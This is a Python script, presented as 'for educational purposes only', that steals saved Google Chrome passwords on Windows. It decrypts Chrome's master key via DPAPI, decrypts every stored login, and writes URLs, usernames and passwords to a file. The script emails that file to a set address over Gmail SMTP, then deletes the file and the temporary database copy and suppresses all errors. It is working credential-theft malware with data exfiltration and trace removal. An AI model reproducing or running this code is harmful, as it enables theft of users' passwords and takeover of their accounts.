######################################################################
'''
This Script is used to retreive all saved passwords of Google Chrome 
in the current users profile and send a copy via email (Windows Only).

For educational purposes only!!!

'''
######################################################################

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def MasterKey():
    # Retreive the master key of chrome from the 'Local State' file
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    Key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    Key = Key[5:]  # removes DPAPI
    Key = win32crypt.CryptUnprotectData(Key, None, None, None, 0)[1]
    return Key


def DecryptPayload(cipher, payload):
    return cipher.decrypt(payload)


def GenerateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def DecryptPassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = GenerateCipher(master_key, iv)
        decrypted_pass = DecryptPayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def sendmail():
    # Send an email with the list of passwords obtained
    try:
        
        sender_email = "example@gmail.com" # Enter Email address to use in sending the email
        receiver_email = "example2@gmail.com"   # Enter Email address as receiver

        msg = MIMEMultipart()

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open((os.environ['USERPROFILE'] + os.sep + r'Documents\\chrome.txt'), "rb").read())  #Attaching the saved password file from the user's Documents directory
        encoders.encode_base64(part)

        part.add_header('Content-Disposition', 'attachment; filename="chrome.txt"')

        msg.attach(part)

        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        connection = smtplib.SMTP('smtp.gmail.com', 587)
        connection.ehlo()
        connection.starttls(context=context)
        connection.ehlo()
        connection.login('example@gmail.com', 'password') # Change to senders email and password used for login
        connection.sendmail(sender_email, receiver_email, msg.as_string())

    except:
        pass

    try:
        os.remove(os.environ['USERPROFILE'] + os.sep + r'Documents\\chrome.txt')

    except Exception as e:
        pass

if __name__ == '__main__':
 
    master_key = MasterKey()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'

    # Making a temp copy of the database file since the "Login Data" DB will be locked if Chrome is running. Temp copy will be stored in the user's Documents directory
    shutil.copy2(login_db, os.environ['USERPROFILE'] + os.sep + r'Documents\\' + "Login.db")  # You may change the location if you want to
    conn = sqlite3.connect(os.environ['USERPROFILE'] + os.sep + r'Documents\\' + "Login.db")
    cursor = conn.cursor()
    results = open((os.environ['USERPROFILE'] + os.sep + r'Documents\\chrome.txt'), "w")  # Saving passwords to a text file in the user's Documents directory. Change it if necessary
    
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        for i in cursor.fetchall():
            url = i[0]
            username = i[1]
            encrypted_password = i[2]
            decrypted_password = DecryptPassword(encrypted_password, master_key)
            if ((decrypted_password != "Chrome < 80") & (decrypted_password != "")):
                results.writelines("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n") 
            else:
                pass
    except Exception as e:
        pass
    
    results.close()
    sendmail()
    cursor.close()
    conn.close()
    try:
        os.remove(os.environ['USERPROFILE'] + os.sep + r'Documents\\' + "Login.db") # Remove the temp database file
    except Exception as e:
        pass